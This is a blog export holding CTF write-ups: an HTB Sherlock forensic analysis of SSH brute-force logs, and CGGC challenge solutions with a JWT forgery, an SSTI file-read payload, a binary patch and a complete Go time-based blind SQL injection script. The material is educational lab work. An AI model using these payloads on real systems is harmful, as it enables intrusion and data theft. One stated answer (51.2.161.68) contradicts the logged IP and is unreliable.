[{"content":"","date":"2024-05-11","externalUrl":null,"permalink":"/tags/brutus/","section":"Tags","summary":"","title":"Brutus","type":"tags"},{"content":"","date":"2024-05-11","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"","date":"2024-05-11","externalUrl":null,"permalink":"/tags/htb/","section":"Tags","summary":"","title":"HTB","type":"tags"},{"content":" Sherlock Scenario # In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We\u0026rsquo;ll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.\n題目素材 # 壓縮檔中有兩個檔案\nauth.log wtmp auth.log # 問 ChatGPT：\nauth.log 是一種記錄系統中使用者身份驗證（authentication）相關事件的日誌檔案。在許多 Linux 和 Unix 系統中，auth.log 通常位於 /var/log 目錄下，用於記錄使用者登入、登出、密碼驗證失敗等事件。這些事件可以幫助系統管理員追蹤和監控系統的安全性，並在必要時進行調查和排除問題。\nauth.log 的格式通常是以文本形式記錄，每行包含一條事件記錄。以下是一個典型的範例：\nMay 9 12:34:56 hostname sshd[1234]: Failed password for user1 from 192.168.1.100 port 12345 ssh2 這裡是一些可能出現在 auth.log 中的重要元素：\n日期和時間: 事件發生的時間，通常以年月日時分秒的格式出現，如上例中的 May 9 12:34:56。 主機名稱: 事件的主機名稱或 IP 地址，如上例中的 hostname。 服務: 產生事件的程序或服務，比如 sshd 表示 SSH 服務相關的事件。 行程 ID: Process ID (PID) 是記錄事件的相關行程的唯一識別符，通常出現在方括號中，如上例中的 [1234]。 事件訊息: 事件的具體內容，可能包括使用者名稱、IP、Port 等，如上例中的 Failed password for user1 from 192.168.1.100 port 12345 ssh2。 總的來說，auth.log 的格式主要是一個結構化的文本格式，用於記錄系統中身份驗證相關事件的細節資訊，以便於系統管理員進行分析。\nwtmp # 一樣問 ChatGPT：\nwtmp（又稱為 \u0026ldquo;who\u0026rdquo; 代表 \u0026ldquo;who is on\u0026rdquo;）是一個記錄系統中使用者登入和登出事件的日誌檔案。它通常用於追蹤系統中的使用者活動，包括登入和登出時間、登入的使用者名稱、登入方式等。在許多 Unix 和 Linux 系統中，wtmp 檔案位於 /var/log 目錄下。\nwtmp 的格式通常是二進制格式，不像 auth.log 那樣易讀。但是，可以使用 last 或 who 命令來查看 wtmp 檔案中的內容，它們會解析 wtmp 檔案並以易讀的格式顯示登入和登出事件的紀錄。\n以下是 last 命令顯示的一個例子：\nuser1 pts/0 192.168.1.100 Mon May 9 12:34 - 14:56 (02:21) user2 pts/1 192.168.1.101 Sun May 8 08:00 - 10:15 (02:15) 這裡是一些可能在 last 命令輸出中出現的欄位：\n使用者名稱: 登入系統的使用者名稱。 tty: 使用者登入的終端（tty）。 遠端地址: 使用者登入的遠端 IP 位址。 登入時間: 使用者登入系統的時間。 登出時間: 使用者登出系統的時間。 登入持續時間: 使用者登入系統的時間長度。 wtmp 是系統監控和安全性分析的重要工具，可用於追蹤使用者活動和識別潛在的安全問題。\n要讀取 wtmp 檔案的二進制格式需要一些特殊的工具或程式庫來解析。可以自行編寫程式來讀取，或在 Unix 和 Linux 系統中使用 utmpdump。\n問題 # Question 1 # Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?\ngrep 一下 auth.log 中 sshd 一直登入失敗的紀錄，看是哪個 IP 被攻擊者使用。只有 65.2.161.68 這一個 IP 有失敗多次的紀錄。\n┌──(kali㉿kali)-[~/Desktop/HTB/Brutus] └─$ cat auth.log | grep sshd | grep Failed | cut -d\u0026#39; \u0026#39; -f6- sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2 sshd[2331]: Failed password for invalid user admin from 65.2.161.68 port 46436 ssh2 sshd[2332]: Failed password for invalid user admin from 65.2.161.68 port 46444 ssh2 sshd[2335]: Failed password for invalid user admin from 65.2.161.68 port 46460 ssh2 sshd[2337]: Failed password for invalid user admin from 65.2.161.68 port 46498 ssh2 sshd[2334]: Failed password for invalid user admin from 65.2.161.68 port 46454 ssh2 sshd[2338]: Failed password for backup from 65.2.161.68 port 46512 ssh2 sshd[2336]: Failed password for backup from 65.2.161.68 port 46468 ssh2 sshd[2330]: Failed password for invalid user admin from 65.2.161.68 port 46422 ssh2 sshd[2328]: Failed password for invalid user admin from 65.2.161.68 port 46390 ssh2 sshd[2329]: Failed password for invalid user admin from 65.2.161.68 port 46414 ssh2 sshd[2333]: Failed password for invalid user admin from 65.2.161.68 port 46452 ssh2 sshd[2352]: Failed password for backup from 65.2.161.68 port 46568 ssh2 sshd[2351]: Failed password for backup from 65.2.161.68 port 46538 ssh2 sshd[2355]: Failed password for backup from 65.2.161.68 port 46576 ssh2 sshd[2357]: Failed password for backup from 65.2.161.68 port 46582 ssh2 sshd[2357]: Failed password for backup from 65.2.161.68 port 46582 ssh2 sshd[2359]: Failed password for invalid user server_adm from 65.2.161.68 port 46596 ssh2 sshd[2361]: Failed password for invalid user server_adm from 65.2.161.68 port 46614 ssh2 sshd[2368]: Failed password for invalid user server_adm from 65.2.161.68 port 46676 ssh2 sshd[2369]: Failed password for invalid user server_adm from 65.2.161.68 port 46682 ssh2 sshd[2365]: Failed password for invalid user server_adm from 65.2.161.68 port 46644 ssh2 sshd[2366]: Failed password for invalid user server_adm from 65.2.161.68 port 46648 ssh2 sshd[2364]: Failed password for invalid user server_adm from 65.2.161.68 port 46632 ssh2 sshd[2367]: Failed password for invalid user server_adm from 65.2.161.68 port 46664 ssh2 sshd[2363]: Failed password for invalid user server_adm from 65.2.161.68 port 46620 ssh2 sshd[2377]: Failed password for invalid user server_adm from 65.2.161.68 port 46684 ssh2 sshd[2379]: Failed password for invalid user server_adm from 65.2.161.68 port 46698 ssh2 sshd[2380]: Failed password for invalid user server_adm from 65.2.161.68 port 46710 ssh2 sshd[2383]: Failed password for invalid user svc_account from 65.2.161.68 port 46722 ssh2 sshd[2384]: Failed password for invalid user svc_account from 65.2.161.68 port 46732 ssh2 sshd[2387]: Failed password for invalid user svc_account from 65.2.161.68 port 46742 ssh2 sshd[2389]: Failed password for invalid user svc_account from 65.2.161.68 port 46744 ssh2 sshd[2391]: Failed password for invalid user svc_account from 65.2.161.68 port 46750 ssh2 sshd[2393]: Failed password for invalid user svc_account from 65.2.161.68 port 46774 ssh2 sshd[2394]: Failed password for invalid user svc_account from 65.2.161.68 port 46786 ssh2 sshd[2397]: Failed password for invalid user svc_account from 65.2.161.68 port 46814 ssh2 sshd[2398]: Failed password for invalid user svc_account from 65.2.161.68 port 46840 ssh2 sshd[2396]: Failed password for invalid user svc_account from 65.2.161.68 port 46800 ssh2 sshd[2400]: Failed password for invalid user svc_account from 65.2.161.68 port 46854 ssh2 sshd[2399]: Failed password for root from 65.2.161.68 port 46852 ssh2 sshd[2407]: Failed password for root from 65.2.161.68 port 46876 ssh2 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2 sshd[2399]: Failed password for root from 65.2.161.68 port 46852 ssh2 sshd[2407]: Failed password for root from 65.2.161.68 port 46876 ssh2 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2 sshd[2423]: Failed password for backup from 65.2.161.68 port 34834 ssh2 sshd[2424]: Failed password for backup from 65.2.161.68 port 34856 ssh2 Ans: 51.2.161.68\nQuestion 2 # The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?\n一樣 grep 一下 auth.log，這次要找的是成功登入的紀錄，關鍵字是 Accepted。攻擊者的 IP 成功登入的使用者是 root。\n┌──(kali㉿kali)-[~/Desktop/HTB/Brutus] └─$ cat auth.log | grep sshd | grep Accepted | cut -d\u0026#39; \u0026#39; -f6- sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2 Ans: root\nQuestion 3 # Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?\n暴力破解僅嘗試密碼是否可以登入，成功登入就會馬上登出。後續待攻擊者自行登入利用。一開始先回答了 auth.log 的時間戳，結果是錯誤的答案，確認一下提示得知要參考的是 wtmp 的時間。\n不清楚是不是我的環境問題，我在 MacBook Air M1 上面跑 ARM 的 Kali Linux，然後用 utmpdump 讀 wtmp 檔的時候會發生解析錯誤。\n也許我是遇到跟 這篇 Writeup 一樣的問題🤔。\n因此，我另外找了別的方法來讀 wtmp 檔，分別找了 Python 和 Ruby 實作的程式。\nPython 程式也是為了解這題，但我使用時遇到了時區的問題，程式輸出的是我的當地時間，然而題目是用 UTC 時間。這邊需要修改程式來改成 UTC 或自己回推： # print(f\u0026#34;{entry.time} | {entry.type} | {entry.host} | {entry.user}\u0026#34;) print(f\u0026#34;{entry.time.astimezone(pytz.utc)} | {entry.type} | {entry.host} | {entry.user}\u0026#34;) Ruby 程式輸出的是 Unix timestamp，只需要轉換一下就可以了。 問題修正完之後，最終結果如下，時間戳是 2024-03-06 06:32:45。\nPython ┌──(kali㉿kali)-[~/Desktop/HTB/Brutus] └─$ python3 wtmp.py wtmp \u0026lt;snip\u0026gt; 2024-03-06 06:19:55.151913+00:00 | UTmpRecordType.user_process | 203.101.190.9 | root 2024-03-06 06:32:45.387923+00:00 | UTmpRecordType.user_process | 65.2.161.68 | root 2024-03-06 06:37:24.590579+00:00 | UTmpRecordType.dead_process | | 2024-03-06 06:37:35.475575+00:00 | UTmpRecordType.user_process | 65.2.161.68 | cyberjunkie Ruby ┌──(kali㉿kali)-[~/Desktop/HTB/Brutus] └─$ irb irb(main):001:0\u0026gt; require \u0026#34;linux/utmpx\u0026#34; =\u0026gt; true irb(main):002:0\u0026gt; irb(main):003:0\u0026gt; io = File.open(\u0026#34;wtmp\u0026#34;) =\u0026gt; #\u0026lt;File:wtmp\u0026gt; irb(main):004:0\u0026gt; parser = Linux::Utmpx::UtmpxParser.new =\u0026gt; {:ut_type=\u0026gt;0, ... irb(main):005:1* while !io.eof? do irb(main):006:1* puts parser.read(io) irb(main):007:0\u0026gt; end \u0026lt;snip\u0026gt; {:ut_type=\u0026gt;7, :pad_type=\u0026gt;0, :ut_pid=\u0026gt;1583, :ut_line=\u0026gt;\u0026#34;pts/0\u0026#34;, :ut_id=\u0026gt;\u0026#34;ts/0\u0026#34;, :ut_user=\u0026gt;\u0026#34;root\u0026#34;, :ut_host=\u0026gt;\u0026#34;203.101.190.9\u0026#34;, :ut_exit=\u0026gt;{:e_termination=\u0026gt;0, :e_exit=\u0026gt;0}, :ut_session=\u0026gt;0, :ut_tv=\u0026gt;{:tv_sec=\u0026gt;1709705995, :tv_usec=\u0026gt;151913}, :ut_addr_v6=\u0026gt;[-882524663, 0, 0, 0], :reserved=\u0026gt;\u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;} {:ut_type=\u0026gt;7, :pad_type=\u0026gt;0, :ut_pid=\u0026gt;2549, :ut_line=\u0026gt;\u0026#34;pts/1\u0026#34;, :ut_id=\u0026gt;\u0026#34;ts/1\u0026#34;, :ut_user=\u0026gt;\u0026#34;root\u0026#34;, :ut_host=\u0026gt;\u0026#34;65.2.161.68\u0026#34;, :ut_exit=\u0026gt;{:e_termination=\u0026gt;0, :e_exit=\u0026gt;0}, :ut_session=\u0026gt;0, :ut_tv=\u0026gt;{:tv_sec=\u0026gt;1709706765, :tv_usec=\u0026gt;387923}, :ut_addr_v6=\u0026gt;[1090691396, 0, 0, 0], :reserved=\u0026gt;\u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;} {:ut_type=\u0026gt;8, :pad_type=\u0026gt;0, :ut_pid=\u0026gt;2491, :ut_line=\u0026gt;\u0026#34;pts/1\u0026#34;, :ut_id=\u0026gt;\u0026#34;\u0026#34;, :ut_user=\u0026gt;\u0026#34;\u0026#34;, :ut_host=\u0026gt;\u0026#34;\u0026#34;, :ut_exit=\u0026gt;{:e_termination=\u0026gt;0, :e_exit=\u0026gt;0}, :ut_session=\u0026gt;0, :ut_tv=\u0026gt;{:tv_sec=\u0026gt;1709707044, :tv_usec=\u0026gt;590579}, :ut_addr_v6=\u0026gt;[0, 0, 0, 0], :reserved=\u0026gt;\u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;} {:ut_type=\u0026gt;7, :pad_type=\u0026gt;0, :ut_pid=\u0026gt;2667, :ut_line=\u0026gt;\u0026#34;pts/1\u0026#34;, :ut_id=\u0026gt;\u0026#34;ts/1\u0026#34;, :ut_user=\u0026gt;\u0026#34;cyberjunkie\u0026#34;, :ut_host=\u0026gt;\u0026#34;65.2.161.68\u0026#34;, :ut_exit=\u0026gt;{:e_termination=\u0026gt;0, :e_exit=\u0026gt;0}, :ut_session=\u0026gt;0, :ut_tv=\u0026gt;{:tv_sec=\u0026gt;1709707055, :tv_usec=\u0026gt;475575}, :ut_addr_v6=\u0026gt;[1090691396, 0, 0, 0], :reserved=\u0026gt;\u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;} Ans: 2024-03-06 06:32:45\nQuestion 4 # SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker\u0026rsquo;s session for the user account from Question 2?\ngrep 一下 auth.log 中 New session 的紀錄，對應時間建立的工作階段編號是 37。\n┌──(kali㉿kali)-[~/Desktop/HTB/Brutus] └─$ cat auth.log | grep \u0026#34;New session\u0026#34; Mar 6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root. Mar 6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root. Mar 6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root. Mar 6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie. Ans: 37\nQuestion 5 # The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?\n攻擊者新增了一個使用者，並賦予他更高的權限，相關的指令是 groupadd，所以 grep 一下 add 看看。攻擊者新增了一個叫 cyberjunkie 的使用者，並把它加進 sudo 群組。\n┌──(kali㉿kali)-[~/Desktop/HTB/Brutus] └─$ cat auth.log | grep \u0026#34;add\u0026#34; Mar 6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002 Mar 6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie Mar 6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002 Mar 6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1 Mar 6 06:35:15 ip-172-31-35-28 usermod[2628]: add \u0026#39;cyberjunkie\u0026#39; to group \u0026#39;sudo\u0026#39; Mar 6 06:35:15 ip-172-31-35-28 usermod[2628]: add \u0026#39;cyberjunkie\u0026#39; to shadow group \u0026#39;sudo\u0026#39; Ans: cyberjunkie\nQuestion 6 # What is the MITRE ATT\u0026amp;CK sub-technique ID used for persistence?\n攻擊者新建了一個本地使用者。\nAns: T1136.001\nQuestion 7 # How long did the attacker\u0026rsquo;s first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)\n從 auth.log 尋找 session 37 的相關紀錄，然後計算開始到結束的時間差。結果送出答案後是錯的，所以改用 wtmp 的時間試試看，Bingo！\n┌──(kali㉿kali)-[~/Desktop/HTB/Brutus] └─$ cat auth.log | grep \u0026#34;session 37\u0026#34; Mar 6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root. Mar 6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37. Ans: 279\nQuestion 8 # The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?\n攻擊者新建的後門帳戶使用高權限去下載惡意腳本，前面提到該帳戶被加入 sudo 群組，所以 grep 字串 sudo 發現有兩個命令被執行，其中一個正是透過 curl 下載腳本。\n┌──(kali㉿kali)-[~/Desktop/HTB/Brutus] └─$ cat auth.log | grep \u0026#34;sudo\u0026#34; Mar 6 06:35:15 ip-172-31-35-28 usermod[2628]: add \u0026#39;cyberjunkie\u0026#39; to group \u0026#39;sudo\u0026#39; Mar 6 06:35:15 ip-172-31-35-28 usermod[2628]: add \u0026#39;cyberjunkie\u0026#39; to shadow group \u0026#39;sudo\u0026#39; Mar 6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow Mar 6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002) Mar 6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root Mar 6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh Ans: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh\n","date":"2024-05-11","externalUrl":null,"permalink":"/posts/htb+sherlock+brutus+writeup/","section":"Posts","summary":"Sherlock Scenario # In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We\u0026rsquo;ll explore a scenario where a Confluence server was brute-forced via its SSH service.","title":"HTB Sherlock Brutus Writeup","type":"posts"},{"content":"","date":"2024-05-11","externalUrl":null,"permalink":"/","section":"KinJih's space","summary":"","title":"KinJih's space","type":"page"},{"content":"","date":"2024-05-11","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"2024-05-11","externalUrl":null,"permalink":"/tags/sherlock/","section":"Tags","summary":"","title":"Sherlock","type":"tags"},{"content":"","date":"2024-05-11","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"2023-12-09","externalUrl":null,"permalink":"/tags/2023/","section":"Tags","summary":"","title":"2023","type":"tags"},{"content":"","date":"2023-12-09","externalUrl":null,"permalink":"/tags/cggc/","section":"Tags","summary":"","title":"CGGC","type":"tags"},{"content":" [Web] bossti # Description:\nI wish you were a boss wannabe.\n明顯就是要竄改 JWT 來登入\nJWT 解開後，簽名的 Secret 是空值。\n把 JWT 改成題目提示的 boss。\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYm9zcyIsImhhY2siOiIifQ.VhS5VSRlR_RrgIlF-gdl-s1_PVHPQCxB3s8oHgwEPJ4 登入之後變成 SSTI 的題目，透過 Wappalyzer 知道他是 Python Flask，所以要找 Python 的 SSTI payload 來試。\n在 hack 欄位用上 {{ 7*6 }}，結果伺服器幫我們算好 42，確定存在 SSTI。\nhttp://10.99.111.109:5000/boss?data={%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27{{7*6}}%27} 題目要我們嘗試找到 Flag.txt，所以找一下讀檔的 payload。本來應該要找到方法 list files，但通靈當前目錄中了就不需要了。\nhttp://10.99.111.109:5000/boss?data={%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27{{get_flashed_messages.__globals__.__builtins__.open(%22Flag.txt%22).read()}}%27} flag: CGGC{\u0026quot;S$T1_V3RY_EZ_2_Pwn3D_C0ngr4t$\u0026quot;} [MISC] Space game # Description:\nPlay a fun space game and try to get a high score. Move using the arrow keys and press \u0026lsquo;Z\u0026rsquo; to attack.\nbinjgb 是一個 gameboy 模擬器，從 github 上看說要把 .gb 檔案放到伺服器上。\n姑且看一下開發工具記錄到的載入請求，發現有把 game.gb 下載到瀏覽器上，然後 flag 就藏在裡面。\nflag: CGGC{Y0U_WIN!!123} [Reverse] GaoYi # Description:\nAnyone can participate with three million US dollars.\n一個執行檔，要跟高義賭兩局，贏了才有 flag。\nmain 函數，有兩場賭局，把使用者輸入讀進來後再判斷勝負。\n我們要的 flag 在 readFlag()。\nreadFlag() 裡面在算 flag，本想自己算一遍，但覺得太蠢。\n解題思路是嘗試跳過中間的賭局，直接給我 flag 吧！所以要跳到 0x00401e3c，讓他直接算 flag。\n腦筋動到 main 函數一開始的地方，試試看直接跳。\n原本的指令 eb6a 改成 e939040000。\n修改 binary。\nTada!\nflag: CGGC{J00_sh4ll_n07_sH1P_S3cR37S_70_cuS70M3r} [Web] Flag Slot Machine # Description:\nIf you\u0026rsquo;re lucky enough, you\u0026rsquo;ll be able to get the flag.\n// flag.php \u0026lt;?php include_once(\u0026#34;config.php\u0026#34;); if(isset($_GET[\u0026#34;secret\u0026#34;])) { $pwd = $_GET[\u0026#34;secret\u0026#34;]; $dbname = \u0026#39;secret_db\u0026#39;; $conn = new mysqli(HOST, DBUSER, DBPASS, $dbname); if ($conn-\u0026gt;connect_error) { die(\u0026#39;Connection failed: \u0026#39; . $conn-\u0026gt;connect_error); } $stmt = $conn-\u0026gt;prepare(\u0026#34;SELECT * FROM s3cret_table\u0026#34;); $stmt-\u0026gt;execute(); $result = $stmt-\u0026gt;get_result(); $response = array(\u0026#34;data\u0026#34; =\u0026gt; generateRandomString(strlen($flag))); if ($result-\u0026gt;num_rows \u0026gt; 0) { $res = $result-\u0026gt;fetch_assoc(); if($res[\u0026#34;secret\u0026#34;] == $pwd) $response = array(\u0026#34;data\u0026#34; =\u0026gt; $flag); // \u0026lt;-- flag here } flag.php 要我們提供 secret 在 GET 參數中，如果符合 DB 中的 secret 就可以拿到 flag。\n// login.php \u0026lt;?php include_once(\u0026#34;config.php\u0026#34;); fingerprint_check(); if(isset($_POST[\u0026#39;user\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;pwd\u0026#39;])) { $user = $_POST[\u0026#39;user\u0026#39;]; $pwd = $_POST[\u0026#39;pwd\u0026#39;]; } else { $user = $pwd = \u0026#34;\u0026#34;; } //... if($user != \u0026#34;\u0026#34; \u0026amp;\u0026amp; $pwd != \u0026#34;\u0026#34;) { $dbname = \u0026#39;slot_db\u0026#39;; $conn = new mysqli(HOST, DBUSER, DBPASS, $dbname); if ($conn-\u0026gt;connect_error) { die(\u0026#39;Connection failed: \u0026#39; . $conn-\u0026gt;connect_error); } $conn-\u0026gt;set_charset(\u0026#34;utf8\u0026#34;); $stmt = $conn-\u0026gt;prepare(\u0026#34;SELECT * FROM users WHERE username = \u0026#39;\u0026#34; . $user . \u0026#34;\u0026#39; and password = \u0026#39;\u0026#34; . md5($pwd) . \u0026#34;\u0026#39;\u0026#34;); // \u0026lt;-- SQLi here $stmt-\u0026gt;execute(); $result = $stmt-\u0026gt;get_result(); if ($result-\u0026gt;num_rows \u0026gt; 0) { $res = $result-\u0026gt;fetch_assoc(); $_SESSION[\u0026#39;login\u0026#39;] = $res[\u0026#34;username\u0026#34;]; echo \u0026#34;\u0026lt;div\u0026gt;Login successful!\u0026lt;/div\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;script\u0026gt;setTimeout(function(){ window.location.href = \u0026#39;index.php\u0026#39;; }, 1000);\u0026lt;/script\u0026gt;\u0026#34;; } else { echo \u0026#34;\u0026lt;div class=\\\u0026#34;alert alert-danger\\\u0026#34; role=\\\u0026#34;alert\\\u0026#34;\u0026gt;Login failed! QAQ\u0026lt;/div\u0026gt;\u0026#34;; } login.php 存在一個 SQL injection 漏洞，但很遺憾的是它並沒有回顯，因此我們不能直接把 DB 中的資料挖出來顯示到網頁上。\n// config.php \u0026lt;?php session_start(); define(\u0026#34;FINGERPRINT\u0026#34;, \u0026#34;771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0\u0026#34;); define(\u0026#34;DBUSER\u0026#34;, \u0026#34;kaibro\u0026#34;); define(\u0026#34;DBPASS\u0026#34;, \u0026#34;superbig\u0026#34;); define(\u0026#34;HOST\u0026#34;, \u0026#34;localhost\u0026#34;); $flag = \u0026#39;CGGC{fake_flag}\u0026#39;; function session_check() { if(!isset($_SESSION[\u0026#39;login\u0026#39;]) || $_SESSION[\u0026#39;login\u0026#39;] == \u0026#34;\u0026#34;) { header(\u0026#34;Location: login.php\u0026#34;); die(\u0026#34;Plz login\u0026#34;); } } function fingerprint_check() { if($_SERVER[\u0026#39;HTTP_SSL_JA3\u0026#39;] !== FINGERPRINT) die(\u0026#34;Bad hacker! Wrong fingerprint!\u0026#34;); } 在開始嘗試登入前，我們會先被 JA3 指紋給擋住。這題在 Balsn CTF 出過，可以參考以下 writeup。一開始是跟 writeup 一樣用 NodeJS，但 NodeJS 的非同步執行實在是很難處理，所以請用 Go 的版本。\nhttps://ctftime.org/writeup/37976 use mysql; CREATE USER \u0026#39;kaibro\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;superbig\u0026#39;; GRANT SELECT ON *.* TO \u0026#39;kaibro\u0026#39;@localhost IDENTIFIED BY \u0026#39;superbig\u0026#39; WITH GRANT OPTION; FLUSH PRIVILEGES; CREATE DATABASE slot_db; use slot_db; DROP TABLE IF EXISTS `users`; CREATE TABLE `users` ( `id` int(11) DEFAULT NULL, `username` text, `password` text ) ENGINE=MyISAM DEFAULT CHARSET=latin1; LOCK TABLES `users` WRITE; INSERT INTO `users` VALUES (1, \u0026#39;kaibro\u0026#39;, \u0026#39;4647570f7638e378e490db41c24c800a\u0026#39;); UNLOCK TABLES; CREATE DATABASE secret_db; use secret_db; DROP TABLE IF EXISTS `s3cret_table`; CREATE TABLE `s3cret_table` ( `id` int(11) DEFAULT NULL, `secret` text ) ENGINE=MyISAM DEFAULT CHARSET=latin1; LOCK TABLES `s3cret_table` WRITE; INSERT INTO `s3cret_table` VALUES (1, \u0026#39;meowmeowmeow\u0026#39;); UNLOCK TABLES; SQL injection 用 UNION SELECT 要先找出欄位數量，題目有給 DB 結構，所以直接就知道是三個。然後我們想要 secret_db.s3cret_table 的 secret，因為沒辦法直接顯示出來，只能一個字一個字去比對出來。第一步我們想先知道 secret 的長度，這裡只能用 Time-based 的方法，當條件成真時 sleep() 幾秒，試了幾次後知道長度是 32。\nuser=kaibro' UNION Select 1,2,IF(length(secret)=32,SLEEP(5),0) FROM secret_db.s3cret_table WHERE id=1 -- '\u0026amp;pwd=123' 接下來就是開始暴力比對密碼，一個字一個字拿出來比對 ASCII 碼，然後要注意的是 secret 每一段時間就會更新，所以千萬不要手動比對(對\u0026hellip;.我就浪費時間手動比對，也剛好知道可能字串是 [0-9a-f])，這邊也呼應前面所說的請用 Go 版本，因為 GO 比較好算時間差。\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/Danny-Dasilva/CycleTLS/cycletls\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;crypto/tls\u0026#34; \u0026#34;io/ioutil\u0026#34; ) func main() { client := cycletls.Init() // secret length = 32 // Body: \u0026#39;user=kaibro\u0026#39; UNION Select 1,2,IF(length(secret)=32,SLEEP(5),0) FROM secret_db.s3cret_table WHERE id=1 -- \u0026#39;\u0026amp;pwd=123\u0026#39;, secret := \u0026#34;\u0026#34; chars := \u0026#34;abcdef1234567890\u0026#34; for len(secret) \u0026lt; 32 { for _, char := range chars { payload := \u0026#34;user=kaibro\u0026#39; UNION Select 1,IF(SUBSTRING(secret,\u0026#34; + strconv.Itoa(len(secret)+1) + \u0026#34;,1) = CHAR(\u0026#34; + strconv.Itoa(int(char)) + \u0026#34;),SLEEP(2),null),3 FROM secret_db.s3cret_table WHERE id=1 -- \u0026#39;\u0026amp;pwd=123\u0026#34; //fmt.Println(payload) start := time.Now() _, err := client.Do(\u0026#34;https://10.99.111.111:8787/login.php\u0026#34;, cycletls.Options{ Body : payload, Ja3: \u0026#34;771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0\u0026#34;, UserAgent: \u0026#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0\u0026#34;, Headers: map[string]string{ \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, }, InsecureSkipVerify: true, }, \u0026#34;POST\u0026#34;); if err != nil { fmt.Print(\u0026#34;Request Failed: \u0026#34; + err.Error()) } elapsed := time.Since(start) //fmt.Println(elapsed) if (elapsed \u0026gt;= 2000000000) { secret = secret + string(char) fmt.Println(secret) break } } } http.DefaultTransport.(*http.Transport).TLSClientConfig = \u0026amp;tls.Config{InsecureSkipVerify: true} response, err := http.Get(\u0026#34;https://10.99.111.111:8787/flag.php?secret=\u0026#34; + secret) if err != nil { fmt.Print(\u0026#34;Request Failed: \u0026#34; + err.Error()) } // read response body body, error := ioutil.ReadAll(response.Body) if error != nil { fmt.Println(error) } // close response body response.Body.Close() // print response body fmt.Println(string(body)) } 暴力比對完後拿 secret 去餵 flag.php，就可以拿到 flag 了。\n[MISC] Link list # 